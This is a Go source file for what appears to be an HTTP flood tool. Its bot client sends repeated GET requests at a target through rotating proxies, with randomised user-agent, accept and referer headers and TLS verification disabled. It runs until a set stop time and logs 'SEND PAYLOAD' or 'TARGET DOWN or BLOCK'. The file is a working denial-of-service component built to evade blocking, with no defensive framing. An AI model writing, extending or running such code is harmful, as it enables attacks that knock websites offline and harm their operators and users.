package bot

import (
	"crypto/tls"
	"fmt"
	"log"
	"math/rand"
	"net/http"
	"net/url"
	"strings"
	"time"

	"z3ntl3/cursed-objects/globals"

	"github.com/monaco-io/request/request"
)

type (
	BotClient struct {
		Target      string
		StopAt      time.Time
		Concurrency int
	}
)

func ConfigureTransport(proxy globals.Proxy) (*http.Transport, *url.URL, error) {
	proxyUrl, err := url.Parse(fmt.Sprintf("%s://%s", proxy.Protocol, strings.TrimSpace(proxy.ProxyStr)))
	if err != nil {
		return nil, nil, err
	}
	transport := &http.Transport{
		Proxy:             http.ProxyURL(proxyUrl),
		ForceAttemptHTTP2: true,
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: false,
		},
	}

	return transport, proxyUrl, nil
}

func (c *BotClient) Request(proxy globals.Proxy) error {
	if time.Now().Unix() >= c.StopAt.Unix() {
		log.Fatal("Forced STOP due to flood duration exceeded given time")
	}
	req := request.New().
		AddTLSConfig(&tls.Config{InsecureSkipVerify: true}).
		AddHeader(map[string]string{
			"cache-control": "must-revalidate",
			"user-agent":    globals.UAS[rand.Intn(len(globals.UAS))],
			"accept":        globals.ACCEPTS[rand.Intn(len(globals.ACCEPTS))],
			"referer":       globals.REFS[rand.Intn(len(globals.REFS))],
			"connection":    "keep-alive",
		})
	transport, proxyUrl, err := ConfigureTransport(proxy)
	if err != nil {
		return err
	}
	req.Ctx().Client.Transport = transport

	req = req.GET(c.Target)
	for i := 0; i < c.Concurrency; i++ {
		resp := req.Send()
		defer resp.Close()

		if resp.Error() == nil {
			// SUCCESS
			fmt.Printf("\x1b[33m[SEND PAYLOAD]\x1b[0m \x1b[1m %s\r", proxyUrl.Host)
		} else {
			// FAILURE
			fmt.Printf("\x1b[31m[TARGET DOWN or BLOCK]\x1b[0m \x1b[1m %s\r", proxyUrl.Host)
		}
	}

	return nil
}
